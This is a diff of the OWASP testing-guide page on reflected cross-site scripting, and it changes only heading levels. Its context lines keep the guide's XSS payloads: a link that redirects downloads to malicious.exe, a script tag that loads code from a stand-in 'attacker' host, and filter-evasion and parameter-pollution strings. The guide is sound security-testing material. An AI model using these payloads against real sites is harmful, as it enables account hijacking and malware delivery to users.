@@ -1,7 +1,7 @@
 # Testing for Reflected Cross Site Scripting (OTG-INPVAL-001)
 
 
-## Summary
+### Summary
 
 Reflected [Cross-site Scripting (XSS)](https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29) occur when an attacker injects browser executable code within a single HTTP response. The injected attack is not stored within the application itself; it is non-persistent and only impacts users who open a maliciously crafted link or third-party web page. The attack string is included as part of the crafted URI or HTTP parameters, improperly processed by the application, and returned to the victim.
 
@@ -18,8 +18,8 @@ Commonly the attacker's code is written in the Javascript language, but other sc
 
 One of the primary difficulties in preventing XSS vulnerabilities is proper character encoding. In some cases, the web server or the web application could not be filtering some encodings of characters, so, for example, the web application might filter out "`<script>`", but might not filter `%3cscript%3e` which simply includes another encoding of tags.
 
-## How to Test
-### Black Box testing
+### How to Test
+#### Black Box testing
 A black-box test will include at least three phases:
 
 1. Detect input vectors. For each web page, the tester must determine all the web application's user-defined variables and how to input them. This includes hidden or non-obvious inputs such as HTTP parameters, POST data, hidden form field values, and predefined radio or selection values. Typically in-browser HTML editors or web proxies are used to view these hidden variables. See the example below.
@@ -61,7 +61,7 @@ Within the context of an HTML action or JavaScript code, a different set of spec
 For a more complete reference, see the Mozilla JavaScript guide. [https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Values,_variables,_and_literals#Using_special_characters_in_strings]
 
 
-#### Example 1
+##### Example 1
 For example, consider a site that has a welcome notice " Welcome %username% " and a download link.
 <br><br>
 ![Image:XSS Example1.png](https://www.owasp.org/images/a/ad/XSS_Example1.png)
@@ -82,7 +82,7 @@ If no sanitization is applied this will result in the following popup:
 This indicates that there is an XSS vulnerability and it appears that the tester can execute code of his choice in anybody's browser if he clicks on the tester's link.
 
 
-#### Example 2
+##### Example 2
 Let's try other piece of code (link):
 ```
 http://example.com/index.php?user=<script>window.onload = function() {var AllLinks=document.getElementsByTagName("a");
@@ -97,7 +97,7 @@ This produces the following behavior:
 This will cause the user, clicking on the link supplied by the tester, to download the file malicious.exe from a site he controls.
 
 
-### Bypass XSS filters
+#### Bypass XSS filters
 Reflected cross-site scripting attacks are prevented as the web application sanitizes input, a web application firewall blocks malicious input, or by mechanisms embedded in modern web browsers. The tester must test for vulnerabilities assuming that web browsers will not prevent the attack. Browsers may be out of date, or have built-in security features disabled. Similarly, web application firewalls are not guaranteed to recognize novel, unknown attacks. An attacker could craft an attack string that is unrecognized by the web application firewall.
 
 
@@ -107,7 +107,7 @@ Thus, the majority of XSS prevention must depend on the web application's saniti
 The [XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet) documents common filter evasion tests.
 
 
-#### Example 3: Tag Attribute Value
+##### Example 3: Tag Attribute Value
 <br>
 Since these filters are based on a blacklist, they could not block every type of expressions. In fact, there are cases in which an XSS exploit can be carried out without the use of `<script>` tags and even without the use of characters such as " `< >` and `/` that are commonly filtered.
 
@@ -124,7 +124,7 @@ Then an attacker could submit the following code:
 ```
 
 
-#### Example 4: Different syntax or encoding
+##### Example 4: Different syntax or encoding
 <br>
 In some cases it is possible that signature-based filters can be simply defeated by obfuscating the attack. Typically you can do this through the insertion of unexpected variations in the syntax or in the enconding. These variations are tolerated by browsers as valid HTML when the code is returned, and yet they could also be accepted by the filter.
 
@@ -143,7 +143,7 @@ Following some examples:
 ```
 
 
-#### Example 5: Bypassing non-recursive filtering
+##### Example 5: Bypassing non-recursive filtering
 <br>
 Sometimes the sanitization is applied only once and it is not being performed recursively. In this case the attacker can beat the filter by sending a string containing multiple attempts, like this one:
 ```
@@ -151,7 +151,7 @@ Sometimes the sanitization is applied only once and it is not being performed re
 ```
 
 
-#### Example 6: Including external script
+##### Example 6: Including external script
 <br>
 Now suppose that developers of the target site implemented the following code to protect the input from the inclusion of external script:
 ```
@@ -182,7 +182,7 @@ http://example/?var=<SCRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>
 This will exploit the reflected cross site scripting vulnerability shown before, executing the javascript code stored on the attacker's web server as if it was originating from the victim web site, http://example/.
 
 
-#### Example 7: HTTP Parameter Pollution (HPP)
+##### Example 7: HTTP Parameter Pollution (HPP)
 <br>
 Another method to bypass filters is the HTTP Parameter Pollution, this technique was first presented by Stefano di Paola and Luca Carettoni in 2009 at the OWASP Poland conference. See the [Testing for HTTP Parameter pollution](https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_%28OTG-INPVAL-004%29) for more information. This evasion technique consists of splitting an attack vector between multiple parameters that have the same name. The manipulation of the value of each parameter depends on how each web technology is parsing these parameters, so this type of evasion is not always possible. If the tested environment concatenates the values of all parameters with the same name, then an attacker could use this technique in order to bypass pattern-
 based security mechanisms.
@@ -203,13 +203,13 @@ http://example/page.php?param=<script&param=>[...]</&param=script>
 See the [XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet) for a more detailed list of filter evasion techniques. Finally, analyzing answers can get complex. A simple way to do this is to use code that pops up a dialog, as in our example. This typically indicates that an attacker could execute arbitrary JavaScript of his choice in the visitors' browsers.
 
 
-### Gray Box testing
+#### Gray Box testing
 Gray Box testing is similar to Black box testing. In gray box testing, the pen-tester has partial knowledge of the application. In this case, information regarding user input, input validation controls, and how the user input is rendered back to the user might be known by the pen-tester.
 
 
 If source code is available (White Box), all variables received from users should be analyzed. Moreover the tester should analyze any sanitization procedures implemented to decide if these can be circumvented.
 
-## Tools
+### Tools
 * **[OWASP CAL9000](https://www.owasp.org/index.php/OWASP_CAL9000_Project)**
 CAL9000 is a collection of web application security testing tools that complement the feature set of current web proxies and automated scanners. It's hosted as a reference at http://yehg.net/lab/pr0js/pentest/CAL9000/ .
 * **PHP Charset Encoder(PCE)** - http://h4k.in/encoding [mirror: http://yehg.net/e ]
@@ -230,7 +230,7 @@ ZAP is an easy to use integrated penetration testing tool for finding vulnerabil
 OWASP Xenotix XSS Exploit Framework is an advanced Cross Site Scripting (XSS) vulnerability detection and exploitation framework. It provides Zero False Positive scan results with its unique Triple Browser Engine (Trident, WebKit, and Gecko) embedded scanner. It is claimed to have the world’s 2nd largest XSS Payloads of about 1600+ distinctive XSS Payloads for effective XSS vulnerability detection and WAF Bypass. Xenotix Scripting Engine allows you to create custom test cases and addons over the Xenotix API. It is incorporated with a feature rich Information Gathering module for target Reconnaissance. The Exploit Framework includes offensive XSS exploitation modules for Penetration Testing and Proof of Concept creation.
 
 
-## References
+### References
 **OWASP Resources**<br>
 * [XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
 
